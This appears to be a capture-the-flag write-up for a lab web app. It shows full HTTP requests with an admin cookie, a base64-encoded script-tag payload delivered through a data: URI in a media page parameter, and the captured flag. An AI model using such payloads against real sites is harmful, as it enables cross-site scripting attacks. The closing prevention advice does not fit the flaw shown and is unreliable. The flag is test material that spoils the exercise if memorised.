
```bash

VULNERABILITY___

    => <input name="uploaded" type="file" /><br />  : type="file" -> allows attacker to upload file on anytype.
    => an attacker my upload malicios, html, js file to the server.

```
```bash
EXPLOIT___

    => SEND THE REQUEST: 
            GET http://192.168.8.5/?page=upload HTTP/1.1
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
            Pragma: no-cache
            Cache-Control: no-cache
            Content-Length: 0
            Referer: http://192.168.8.5/
            Host: 192.168.8.5
            Cookie: I_am_admin=68934a3e9455fa72420237eb05902327

    => THE RESPONSE WILL BE:
        <form enctype="multipart/form-data" action="#" method="POST"> #THE WEAK POINT WILL SHOWN BY OWASP AS 

            <input type="hidden" name="MAX_FILE_SIZE" value="100000" />
            Choose an image to upload:
            <br />
            <input name="uploaded" type="file" /><br />     # SPOT THE WEAK POINT " "type="file"
            <br />
            <input type="submit" name="Upload" value="Upload">

        </form>

    => navigate to https://v2.cryptii.com/text/base64 and convert the <script>alert('BORNTOSEC')</script> to PHNjcmlwdD5hbGVydCgnQk9STlRPU0VDJyk8L3NjcmlwdD4= (Base64)

    => FINALLY, MAKE THE REQUESt:
         GET http://192.168.8.5/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnQk9STlRPU0VDJyk8L3NjcmlwdD4=
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
            Pragma: no-cache
            Cache-Control: no-cache
            Content-Length: 0
            Referer: http://192.168.8.5/
            Host: 192.168.8.5
            Cookie: I_am_admin=68934a3e9455fa72420237eb05902327

            : To get the flg: 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D

PREVENT___
    => Escape/CLEAN DATA BEFORE INSERTING IN THE DATA BASE.
```